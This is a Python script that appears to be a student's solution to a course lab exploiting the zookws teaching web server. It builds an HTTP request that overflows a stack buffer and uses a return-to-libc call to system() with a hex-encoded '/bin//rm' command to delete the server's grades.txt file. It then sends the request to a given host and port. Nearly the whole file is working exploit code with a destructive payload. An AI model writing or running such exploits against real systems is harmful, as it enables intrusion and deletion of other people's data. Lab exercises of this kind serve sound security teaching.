#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct
import time

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0xdeadc0de
stack_saved_ebp = 0xdeadc0de
stack_retaddr = stack_saved_ebp + 4

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    carriage_rets = "\x0d\x0d\x0d\x0d"
    # 0xbfffddd8
    system_libc_addr = "\x0d\x51\x06\x40"
    ebp = "\x08\xee\xff\xbf"

    rm_string = "\x2f\x62\x69\x6e\x2f\x2f\x72\x6d"
    space_url_encoded = "+" 
    grades_string = "\x2f\x68\x6f\x6d\x65\x2f\x68\x74\x74\x70\x64\x2f\x2f\x2f\x67\x72\x61\x64\x65\x73\x2e\x74\x78\x74"
    system_arg_string = rm_string + space_url_encoded + grades_string 
    grades_string_addr = "\xf4\xd9\xff\xbf"

    num = 900 + 24 * 4 - 36 + 3 
    req =  "GET /aaaaaaaaaaa/%s HTTP/1.0\r\n"  % ("a"*num + system_arg_string + system_libc_addr + ebp*3 + system_libc_addr + grades_string_addr * 2 )
    overflow_header = "Accept: " + system_arg_string  + "\r\n"
    req += overflow_header 
    req += "\r\n"
    return req


def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

